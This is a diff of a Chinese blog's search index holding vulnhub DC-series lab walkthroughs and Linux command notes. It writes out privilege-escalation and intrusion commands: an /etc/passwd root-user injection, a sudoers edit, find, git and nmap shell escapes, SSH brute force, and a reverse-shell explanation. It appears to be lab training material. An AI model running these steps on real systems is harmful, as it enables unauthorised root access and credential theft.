@@ -622,8 +622,7 @@
 <p>安装插件： 在 ~&#x2F;.vimrc 添加</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">call plug<span class="punctuation">#</span><span class="keyword">begin</span><span class="params">(&#x27;~<span class="operator">/</span>.<span class="variable">vim</span><span class="operator">/</span><span class="variable">plugged</span>&#x27;)</span></span><br><span class="line">Plug &#x27;preservim/nerdtree&#x27;</span><br><span class="line">Plug &#x27;junegunn/fzf&#x27;</span><br><span class="line">call plug<span class="punctuation">#</span><span class="keyword">end</span><span class="params">()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 <p>插件指令：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:PlugInstall</span>        <span class="comment"># 安装插件（从 ~/.vimrc 配置的源下载并安装插件）</span></span><br><span class="line"><span class="symbol">:PlugUpdate</span>         <span class="comment"># 更新已安装的插件</span></span><br><span class="line"><span class="symbol">:PlugUpgrade</span>        <span class="comment"># 更新 Vim-Plug 本身</span></span><br><span class="line"><span class="symbol">:PlugClean</span>          <span class="comment"># 清理无用的插件（删除未在 ~/.vimrc 配置中的插件）</span></span><br><span class="line"><span class="symbol">:PlugStatus</span>         <span class="comment"># 显示已安装插件的状态</span></span><br><span class="line"><span class="symbol">:PlugDiff</span>           <span class="comment"># 显示本地插件与远程仓库的差异</span></span><br></pre></td></tr></table></figure></div>
-]]></content>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:PlugInstall</span>        <span class="comment"># 安装插件（从 ~/.vimrc 配置的源下载并安装插件）</span></span><br><span class="line"><span class="symbol">:PlugUpdate</span>         <span class="comment"># 更新已安装的插件</span></span><br><span class="line"><span class="symbol">:PlugUpgrade</span>        <span class="comment"># 更新 Vim-Plug 本身</span></span><br><span class="line"><span class="symbol">:PlugClean</span>          <span class="comment"># 清理无用的插件（删除未在 ~/.vimrc 配置中的插件）</span></span><br><span class="line"><span class="symbol">:PlugStatus</span>         <span class="comment"># 显示已安装插件的状态</span></span><br><span class="line"><span class="symbol">:PlugDiff</span>           <span class="comment"># 显示本地插件与远程仓库的差异</span></span><br></pre></td></tr></table></figure></div>]]></content>
       <categories>
         <category>linux</category>
         <category>笔记</category>
@@ -632,24 +631,6 @@
         <tag>linux</tag>
         <tag>操作系统</tag>
         <tag>shell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DC1靶场复盘</title>
-    <url>/posts/52872.html</url>
-    <content><![CDATA[<p>vulnhub-DC1靶场复盘</p>
-<span id="more"></span>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a2905d0e0a243d4f8771d.png" alt="|500"><br>这个靶机用的是drupal    还可以下载droopescan扫描器   网上教程是用pip3安装但是我的版本无法用这个安装 需要下载pipx 并且要用bash <code>pipx ensurepath</code>  用虚拟环境 来运行<code>python3 -m venv droopescan-env; source droopescan-env/bin/activate</code></p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>用 wapp可以得到drupal的版本号<br><img src="https://pic1.imgdb.cn/item/679a2948d0e0a243d4f87727.png" alt="|375">&#96;<br>用searchsploit查看druptal的漏洞<br><img src="https://pic1.imgdb.cn/item/679a2909d0e0a243d4f8771e.png"><br>这里利用这个add admin的脚本 -t -u -p 添加一个管理员账户<br>接着仿照以前的经验 下载php插件   在文章中插入php 代码 拿到webshell<br><img src="https://pic1.imgdb.cn/item/679a290ad0e0a243d4f8771f.png"><br><img src="https://pic1.imgdb.cn/item/679a290dd0e0a243d4f87721.png" alt="|500"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看suid<br><img src="https://pic1.imgdb.cn/item/679a290cd0e0a243d4f87720.png"><br>发现find指令有suid   所以可以利用find  后面执行一个命令 比如我们用 -exec cat &#x2F;etc&#x2F;shadow \; 看  后面要加反斜杠和封号告诉find后面不用再解析命令了   这样可以用root执行命令 拿到flag<br>法二：拿到flag4用户的hash之后 用john破解 登录到flag4用户  用find提权<br><mark>find提权</mark> -exec ‘&#x2F;bin&#x2F;sh’ \;  解决</p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>vulnhub</tag>
       </tags>
   </entry>
   <entry>
@@ -1325,6 +1306,31 @@
 <blockquote>
 <p>&amp;1 将标准输入重定向到标准输出。这意味着输入流会从 TCP 连接而不是终端接收。<br>通过这一部分，bash 的标准输入（命令输入）会从远程机器的 TCP 连接接收，而不是从用户的终端接收。<br>综合解释<br>整个命令的作用是：<br>启动一个交互式 Bash shell (bash -i)。<br>将标准输出和标准错误输出重定向到一个 TCP 连接，目标 IP 为 192.168.240.83，目标端口为 1234。<br>将标准输入重定向到 TCP 连接，从远程机器接收输入。<br>反向 Shell<br>这行命令的作用就是创建一个反向 shell。受害主机通过 bash 连接到攻击者的机器，并通过一个指定的端口（这里是 1234）与攻击者进行交互：</p>
 </blockquote>
+<h2 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h2><p>ln 是 Linux 系统中的 创建链接命令，用于创建 硬链接 或 符号链接（软链接）。</p>
+<h3 id="常用参数-6"><a href="#常用参数-6" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-s</code></td>
+<td>创建符号链接（软链接）</td>
+</tr>
+<tr>
+<td><code>-f</code></td>
+<td>强制覆盖已存在的链接</td>
+</tr>
+<tr>
+<td><code>-v</code></td>
+<td>显示详细信息</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>取消对目标的符号链接解析</td>
+</tr>
+</tbody></table>
 ]]></content>
       <categories>
         <category>linux</category>
@@ -1364,20 +1370,32 @@
       </tags>
   </entry>
   <entry>
-    <title>DC4靶场复盘</title>
-    <url>/posts/52100.html</url>
-    <content><![CDATA[<p>vulnhub-DC4靶场复盘</p>
+    <title>DC1靶场复盘</title>
+    <url>/posts/52872.html</url>
+    <content><![CDATA[<p>vulnhub-DC1靶场复盘</p>
 <span id="more"></span>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>这个靶机开放80和22端口   没有什么多余信息</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a1f99d0e0a243d4f87640.png" alt="|400"><br>只有一个登录界面  只能爆破  用bp爆破得到admin密码 登入管理员界面<br><img src="https://pic1.imgdb.cn/item/679a20f5d0e0a243d4f87658.png" alt="|500"><br><img src="https://pic1.imgdb.cn/item/679a20f6d0e0a243d4f87659.png" alt="|825"><br>这里的界面可以运行一些shell的指令 猜测在页面的请求包里面有指令 用bp试试<br><img src="https://pic1.imgdb.cn/item/679a20f7d0e0a243d4f8765a.pngg" alt="500"><br>发现果然是  空格用+绕过 现在就把指令变成反弹shell  拿到www的shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这题提权方式有很多种</p>
-<h3 id="1用exim漏洞"><a href="#1用exim漏洞" class="headerlink" title="1用exim漏洞"></a>1用exim漏洞</h3><p>步骤和DC8一模一样</p>
-<h3 id="2访问不同用户的信息"><a href="#2访问不同用户的信息" class="headerlink" title="2访问不同用户的信息"></a>2访问不同用户的信息</h3><p><img src="https://pic1.imgdb.cn/item/679a20f8d0e0a243d4f8765b.png"><br>在home目录下面有三个用户<br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765e.png" alt="|500"><br>jim这里有一个只有jim可以读写的文件 肯定有东西   在目录backups下面有一些密码<br>现在用爆破看看是否能登录jim的ssh<br>通过hydra成功进入ssh <code>hydra -l jim -P pass.txt ssh://192.168.240.249</code><br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765f.png"><br>登录到jim看到mbox中的内容是一封邮件 但是没有什么有用的信息<br>到&#x2F;var&#x2F;mail路径下 看到有一个jim邮件  里面有另一个用户的密码  登录到charles中 (这里邮件中的C是大写的 但是登录ssh要用小写c不知道为什么)<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87660.png" alt="|500"><br>发现这个用户有一个用root执行teehee的权限<br>有两种方式用teehee提权  一种是<br> <code>echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code><br><mark>可以看到teehee可以把一个语句加到某个文件里面</mark>  这里是新建了一个用户有了root权限<br>也可以用teehee把charles变成一个超级用户 写到&#x2F;etc&#x2F;sudoers 中<br> <code>echo &quot;charles ALL=(ALL:ALL) ALL&quot; | sudo teehee -a /etc/sudoers</code><br>这里sudo要写在分隔符后面 因为是有root权限执行teehee</p>
-<h2 id="用test-sh"><a href="#用test-sh" class="headerlink" title="用test.sh"></a>用test.sh</h2><p>刚才jim目录下有一个test.sh 文件 权限是-rwsrwxrwx<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87661.png" alt="|500"><br><strong>SUID (Set User ID)</strong>：</p>
-<ul>
-<li>当文件的执行权限中出现 <code>s</code> （在所有者权限位置），表示该文件是设置了 SUID 权限。SUID 权限让用户执行这个文件时，程序以文件所有者的权限运行，而不是以执行它的用户的权限运行。</li>
-<li>例如，如果文件的所有者是 <code>root</code>，那么无论哪个用户执行该文件，都会以 <code>root</code> 权限运行它。<br>所以可以在文件后面加上一句反弹shell  用root身份执行 就可以拿到rootshell<br><img src="https://pic1.imgdb.cn/item/679a212bd0e0a243d4f87662.png"></li>
-</ul>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a2905d0e0a243d4f8771d.png" alt="|500"><br>这个靶机用的是drupal    还可以下载droopescan扫描器   网上教程是用pip3安装但是我的版本无法用这个安装 需要下载pipx 并且要用bash <code>pipx ensurepath</code>  用虚拟环境 来运行<code>python3 -m venv droopescan-env; source droopescan-env/bin/activate</code></p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>用 wapp可以得到drupal的版本号<br><img src="https://pic1.imgdb.cn/item/679a2948d0e0a243d4f87727.png" alt="|375">&#96;<br>用searchsploit查看druptal的漏洞<br><img src="https://pic1.imgdb.cn/item/679a2909d0e0a243d4f8771e.png"><br>这里利用这个add admin的脚本 -t -u -p 添加一个管理员账户<br>接着仿照以前的经验 下载php插件   在文章中插入php 代码 拿到webshell<br><img src="https://pic1.imgdb.cn/item/679a290ad0e0a243d4f8771f.png"><br><img src="https://pic1.imgdb.cn/item/679a290dd0e0a243d4f87721.png" alt="|500"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看suid<br><img src="https://pic1.imgdb.cn/item/679a290cd0e0a243d4f87720.png"><br>发现find指令有suid   所以可以利用find  后面执行一个命令 比如我们用 -exec cat &#x2F;etc&#x2F;shadow \; 看  后面要加反斜杠和封号告诉find后面不用再解析命令了   这样可以用root执行命令 拿到flag<br>法二：拿到flag4用户的hash之后 用john破解 登录到flag4用户  用find提权<br><mark>find提权</mark> -exec ‘&#x2F;bin&#x2F;sh’ \;  解决</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC2靶场复盘</title>
+    <url>/posts/3469.html</url>
+    <content><![CDATA[<p>vulnhub-DC2靶场复盘</p>
+<span id="more"></span>
+<p>先根据提示 修改host</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a2562d0e0a243d4f876b9.png" alt="|275"><br>扫描的结果显示只有一个80端口 但是实际上有一个ssh端口 用-p-扫描所有端口  7744</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a2563d0e0a243d4f876ba.png" alt="|900"><br>页面上有一个flag提示要用到cewl扫描 然后用扫描出来的内容当作爆破的字典 <code>cewl -w pass.txt http://dc-2/</code><br>这个是一个wordpress cms   我们可以用wpscan扫一下用户名<br><code>wpscan --url http://dc-2/ --enumerate u</code><br>得到两个用户名 tom和jerry<br>然后用bp爆破  得到两个账户  我们分别登录到这两个账户<br><img src="https://pic1.imgdb.cn/item/679a2565d0e0a243d4f876bb.png" alt="|725"><br><img src="https://pic1.imgdb.cn/item/679a2566d0e0a243d4f876bc.png" alt="|925"><br><img src="https://pic1.imgdb.cn/item/679a2566d0e0a243d4f876bd.png" alt="|500"><br>找到了flag2 我们用ssh 登录 这个flag 在jerry账户找到的 用tom登录ssh<br><img src="https://pic1.imgdb.cn/item/679a25b3d0e0a243d4f876c4.png" alt="|475"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a25b4d0e0a243d4f876c5.png"><br>发现了不是普通bash 是rbash  命令受限制<br><img src="https://pic1.imgdb.cn/item/679a25b5d0e0a243d4f876c6.png"><br>查看可以执行的命令<br>这里我们用vi逃逸 : 进入vi之后输入 :set shell&#x3D;&#x2F;bin&#x2F;bash :shell  再修改一下环境 export PATH&#x3D;’&#x2F;usr&#x2F;bin:&#x2F;bin’<br> 执行 <code>cat /etc/passwd</code> 可以看到还有一个jerry 的账户 我们用su切换到jerry<br> 发现jerry可以用root权限执行 git  现在用git提权<br> <img src="https://pic1.imgdb.cn/item/679a25b7d0e0a243d4f876c7.png"><br> <code>sudo git help config !/bin/bash #输入!/bin/bash，即可打开一个用户为root的shell</code> </p>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -1408,14 +1426,59 @@
       </tags>
   </entry>
   <entry>
-    <title>DC2靶场复盘</title>
-    <url>/posts/3469.html</url>
-    <content><![CDATA[<p>vulnhub-DC2靶场复盘</p>
+    <title>DC4靶场复盘</title>
+    <url>/posts/52100.html</url>
+    <content><![CDATA[<p>vulnhub-DC4靶场复盘</p>
 <span id="more"></span>
-<p>先根据提示 修改host</p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a2562d0e0a243d4f876b9.png" alt="|275"><br>扫描的结果显示只有一个80端口 但是实际上有一个ssh端口 用-p-扫描所有端口  7744</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a2563d0e0a243d4f876ba.png" alt="|900"><br>页面上有一个flag提示要用到cewl扫描 然后用扫描出来的内容当作爆破的字典 <code>cewl -w pass.txt http://dc-2/</code><br>这个是一个wordpress cms   我们可以用wpscan扫一下用户名<br><code>wpscan --url http://dc-2/ --enumerate u</code><br>得到两个用户名 tom和jerry<br>然后用bp爆破  得到两个账户  我们分别登录到这两个账户<br><img src="https://pic1.imgdb.cn/item/679a2565d0e0a243d4f876bb.png" alt="|725"><br><img src="https://pic1.imgdb.cn/item/679a2566d0e0a243d4f876bc.png" alt="|925"><br><img src="https://pic1.imgdb.cn/item/679a2566d0e0a243d4f876bd.png" alt="|500"><br>找到了flag2 我们用ssh 登录 这个flag 在jerry账户找到的 用tom登录ssh<br><img src="https://pic1.imgdb.cn/item/679a25b3d0e0a243d4f876c4.png" alt="|475"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a25b4d0e0a243d4f876c5.png"><br>发现了不是普通bash 是rbash  命令受限制<br><img src="https://pic1.imgdb.cn/item/679a25b5d0e0a243d4f876c6.png"><br>查看可以执行的命令<br>这里我们用vi逃逸 : 进入vi之后输入 :set shell&#x3D;&#x2F;bin&#x2F;bash :shell  再修改一下环境 export PATH&#x3D;’&#x2F;usr&#x2F;bin:&#x2F;bin’<br> 执行 <code>cat /etc/passwd</code> 可以看到还有一个jerry 的账户 我们用su切换到jerry<br> 发现jerry可以用root权限执行 git  现在用git提权<br> <img src="https://pic1.imgdb.cn/item/679a25b7d0e0a243d4f876c7.png"><br> <code>sudo git help config !/bin/bash #输入!/bin/bash，即可打开一个用户为root的shell</code> </p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>这个靶机开放80和22端口   没有什么多余信息</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a1f99d0e0a243d4f87640.png" alt="|400"><br>只有一个登录界面  只能爆破  用bp爆破得到admin密码 登入管理员界面<br><img src="https://pic1.imgdb.cn/item/679a20f5d0e0a243d4f87658.png" alt="|500"><br><img src="https://pic1.imgdb.cn/item/679a20f6d0e0a243d4f87659.png" alt="|825"><br>这里的界面可以运行一些shell的指令 猜测在页面的请求包里面有指令 用bp试试<br><img src="https://pic1.imgdb.cn/item/679a20f7d0e0a243d4f8765a.pngg" alt="500"><br>发现果然是  空格用+绕过 现在就把指令变成反弹shell  拿到www的shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这题提权方式有很多种</p>
+<h3 id="1用exim漏洞"><a href="#1用exim漏洞" class="headerlink" title="1用exim漏洞"></a>1用exim漏洞</h3><p>步骤和DC8一模一样</p>
+<h3 id="2访问不同用户的信息"><a href="#2访问不同用户的信息" class="headerlink" title="2访问不同用户的信息"></a>2访问不同用户的信息</h3><p><img src="https://pic1.imgdb.cn/item/679a20f8d0e0a243d4f8765b.png"><br>在home目录下面有三个用户<br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765e.png" alt="|500"><br>jim这里有一个只有jim可以读写的文件 肯定有东西   在目录backups下面有一些密码<br>现在用爆破看看是否能登录jim的ssh<br>通过hydra成功进入ssh <code>hydra -l jim -P pass.txt ssh://192.168.240.249</code><br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765f.png"><br>登录到jim看到mbox中的内容是一封邮件 但是没有什么有用的信息<br>到&#x2F;var&#x2F;mail路径下 看到有一个jim邮件  里面有另一个用户的密码  登录到charles中 (这里邮件中的C是大写的 但是登录ssh要用小写c不知道为什么)<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87660.png" alt="|500"><br>发现这个用户有一个用root执行teehee的权限<br>有两种方式用teehee提权  一种是<br> <code>echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code><br><mark>可以看到teehee可以把一个语句加到某个文件里面</mark>  这里是新建了一个用户有了root权限<br>也可以用teehee把charles变成一个超级用户 写到&#x2F;etc&#x2F;sudoers 中<br> <code>echo &quot;charles ALL=(ALL:ALL) ALL&quot; | sudo teehee -a /etc/sudoers</code><br>这里sudo要写在分隔符后面 因为是有root权限执行teehee</p>
+<h2 id="用test-sh"><a href="#用test-sh" class="headerlink" title="用test.sh"></a>用test.sh</h2><p>刚才jim目录下有一个test.sh 文件 权限是-rwsrwxrwx<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87661.png" alt="|500"><br><strong>SUID (Set User ID)</strong>：</p>
+<ul>
+<li>当文件的执行权限中出现 <code>s</code> （在所有者权限位置），表示该文件是设置了 SUID 权限。SUID 权限让用户执行这个文件时，程序以文件所有者的权限运行，而不是以执行它的用户的权限运行。</li>
+<li>例如，如果文件的所有者是 <code>root</code>，那么无论哪个用户执行该文件，都会以 <code>root</code> 权限运行它。<br>所以可以在文件后面加上一句反弹shell  用root身份执行 就可以拿到rootshell<br><img src="https://pic1.imgdb.cn/item/679a212bd0e0a243d4f87662.png"></li>
+</ul>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC5靶场复盘</title>
+    <url>/posts/19078.html</url>
+    <content><![CDATA[<p>vulnhub-DC5靶场复盘</p>
+<span id="more"></span>
+<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>这题的靶场提示要在web找到刷新改变的东西<br><img src="https://pic1.imgdb.cn/item/679a1f6ed0e0a243d4f87639.png"><br>这个靶机只有一个80端口 没有22ssh端口<br>而且这个网站没有用cms  是一个静态的页面</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>在contact us 里有输入框 用sqlmap 扫描之后没有注入点<br>在contact us 输入内容返回的thank you.php 界面刷新 发现下面的footer会刷新 查看页面源代码<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763a.png" alt="|450"><br>这个界面是有一个footer.php的 所以这里有一个文件包含漏洞  因为是其他有调用这个footer.php<br>但是现在不知道用什么关键字访问到包含文件  所以我们用wfuzz跑关键字<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763b.png" alt="|575"><br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png"><br>找到了关键字是file  现在就可以访问服务器中的文件了   <strong>现在的又一个难题是只能看到文件如何才能拿到shell呢</strong><br>我们知道如果可以写入一个一句话木马就可以拿到shell   但是应该用什么方式实现呢？<br>用apache2服务访问的日志 错误日志也会存 存在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log 中  这里没有我们就用nginx<br>下一步就是用bp修改<br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png" alt="|425"><br>这一条记录会在access.log中<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763e.png"><br>我们的标记存在 而且后面的php代码没有显示出来 说明被成功解析了  用蚁剑连接shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在上一步拿到蚁剑的shell之后反弹到本机中<br>提权思路还是找到存在漏洞的服务<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763f.png" alt="|450"><br>这里有一个screen服务而且告诉了版本号 大概率就是利用这个<br>然后用wget 从靶机下载本机的这个脚本  <mark>注意这个脚本不能再www目录下运行  在其他目录下wget</mark><br>运行之后拿到root权限 解决！！！ </p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC6靶场复盘</title>
+    <url>/posts/35203.html</url>
+    <content><![CDATA[<p>vulnhub-DC6靶场复盘</p>
+<span id="more"></span>
+
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先要根据vulnhub上面的提示  修改本机和kali的host文件<br>给了一个提示<br><img src="https://pic1.imgdb.cn/item/679a1d0ed0e0a243d4f875f5.png"><br>让我们扫描 先把指定的密码字典存起来   我们用bp爆破管理员账户</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>这个站点是用wordpress创建的 可以访问readme.html 就可以看到哪里是登录界面 一般还会有版本信息<br><img src="https://pic1.imgdb.cn/item/679a1d0ed0e0a243d4f875f6.png" alt="|450"></p>
+<p>后台登录界面就在&#x2F;wp-admin  现在就是爆破 用admin爆破    我们尝试了爆破 但是无法得到密码<br>现在用wpscan扫描 指定url 和apitoken    然后枚举用户名   <code>wpscan --url wordy --enumerate u</code><br>然后把得到的用户名存在一个文件里面  爆破用户名和密码 </p>
+<p>接着就可以登录到管理员账户<br>然后利用web上的信息拿到shell 这里要用到插件的activity monitor 插件漏洞 用searchsploit<br><img src="https://pic1.imgdb.cn/item/679a1d14d0e0a243d4f875f7.png" alt="|500"><br>利用这个漏洞   修改payload 上传到本机 在web端访问<br><img src="https://pic1.imgdb.cn/item/679a1d16d0e0a243d4f875f8.png" alt="|425"><br>然后在web端点击这个文件 就可以拿到shell<br><img src="https://pic1.imgdb.cn/item/679a1d17d0e0a243d4f875f9.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这个www用户目录下面其实没有什么有用的东西   &#x3D;&#x3D;去&#x2F;home&#x2F;&#x3D;&#x3D; 目录下   这里可以看到其他几个用户的文件夹<br>找到jens用户 目录下有一个backup.sh<br><code>ls -al backups.sh</code><br><code>-rwxrwxr-x 1 jens devs 50 Apr 26  2019 backups.sh</code><br>可以看到devs组的人有rwx权限 所有用户都有x权限<br>然后在mark用户的文件夹下面有一个stuff文件夹 里面有一个账号密码 可以登录到ssh<br><img src="https://pic1.imgdb.cn/item/679a1d5cd0e0a243d4f87600.png"><br><code>graham@dc-6:~$ id</code><br><code>uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)</code><br>这个用户是属于devs这个组的 所以有写入文件的权限<br><img src="https://pic1.imgdb.cn/item/679a1d5dd0e0a243d4f87601.png" alt="|500"><br>可以发现这个用户可以不用密码就用jens用户的名义执行刚才的那个脚本<br>我们先在那个脚本文件后面加上<code>graham@dc-6:~$ echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.sh</code><br>这样子就可以让执行脚本的人返回shell   这样子就拿到了jens的shell<br><img src="https://pic1.imgdb.cn/item/679a1d5dd0e0a243d4f87602.png" alt="|450"><br>这个用户可以用root身份执行 nmap  所以用nmap提权<br>在网上找资料后 发现nmap可以用srcipt提权<br><img src="https://pic1.imgdb.cn/item/679a1d9dd0e0a243d4f87604.png" alt="|500"><br>或者可以把’os.execute(“&#x2F;bin&#x2F;bash”) 写到一个s.nse文件里 然后–script 传入这个文件</p>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -1448,24 +1511,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DC8靶场复盘</title>
-    <url>/posts/51727.html</url>
-    <content><![CDATA[<p>vulnhub-DC8靶场复盘</p>
-<span id="more"></span>
-<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>这个主要考察从web端进入</p>
-<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>0.用dirsearch找到网页所有的目录  知道有mysql服务 暗示要sql注入  而且有robots.txt 其中有user&#x2F;login目录<br>1.在网页点击其他链接的时候看到url有参数 尝试注释闭合<br>发现有sql注入点<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87546.png" alt="|550"><br>2.用sqlmap得到管理员账号<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87547.png" alt="|500"><br>最终找到两条记录 然后将这个hash放到一个目录用john 去跑 可以找到john的密码<br>3.登录网站管理员的账号<br>有一个edit选项 里面可以上传文件 但是无法上传php文件<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87548.png" alt="|500"><br>在contactus webform 发现可以修改用户上传之后的提示回显  并且可以用PHP代码 实验之后发现确实可以渲染php<br>现在可以用system指令来反弹shell<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87549.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/679a1622d0e0a243d4f8754a.png"><br>这个指令可以在反弹的shell里面加上前缀 可以美化输出<br>随便看看这个用户目录下的文件 </p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null  意思从根目录开始找 所有者是root 只包括suid 的 然后将标准错误不输出<br><img src="https://pic1.imgdb.cn/item/679a1666d0e0a243d4f8754f.png" alt="|500"><br>这里利用exim提权（先查看这里exim4的版本  用searchsploit exim发现漏洞<br>然后把文件复制到&#x2F;var&#x2F;www&#x2F;html 下方便传输到受害机<br><img src="https://pic1.imgdb.cn/item/679a1669d0e0a243d4f87550.png" alt="|425"><br>在受害机上面用wget接受这个脚本<br><img src="https://pic1.imgdb.cn/item/679a166ad0e0a243d4f87551.png"><br><img src="https://pic1.imgdb.cn/item/679a166bd0e0a243d4f87552.png"><br>有两种方法使用这个脚本 选择第二种 因为 第二种在脚本说可以有一个shell<br>但是如果我们用 cat -A 查看这个a.sh 文件发现 末尾都是^M<br>用dos2unix转换之后 可以运行   bash a.sh -m netcat<br><img src="https://pic1.imgdb.cn/item/679a166cd0e0a243d4f87553.png" alt="|450"><br>发现成功提权 然后到&#x2F;root目录下 就解决！！ </p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DC9靶场复盘</title>
     <url>/posts/14257.html</url>
     <content><![CDATA[<p>vulnhub-DC9靶场复盘</p>
@@ -1475,24 +1520,6 @@
